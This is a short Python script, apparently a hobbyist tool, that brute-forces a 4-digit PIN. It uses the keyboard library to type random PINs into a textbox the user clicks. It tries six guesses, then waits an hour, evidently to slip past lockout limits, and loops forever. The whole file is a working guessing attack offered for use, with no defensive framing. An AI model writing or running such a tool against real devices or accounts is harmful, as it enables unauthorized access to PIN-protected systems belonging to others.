from time import sleep as wait
import random as r
import keyboard as k

# Write something using the virtual keyboard.
def write_with_keyboard(sentence):
    k.write(sentence)
    k.press('Enter')

waitin = input("Press `Enter` on your keyboard to start bruteforcing... ")
print('Please click on the PIN textbox.')
print('Wait 6 seconds after you have clicked on the textbox..')
print('Use CTRL+C or CTRL+D to cancel this.')

wait(6)
while True: # Set a loop that goes on forever..
    for i in range(6):
        pin = str(r.randint(0, 9999)).zfill(4) # Generate a random PIN.
        print(f"Trying PIN: {pin}")
        write_with_keyboard(pin)
        
    print("Tried 6 PINs, waiting for 1 hour...")
    wait(3600)
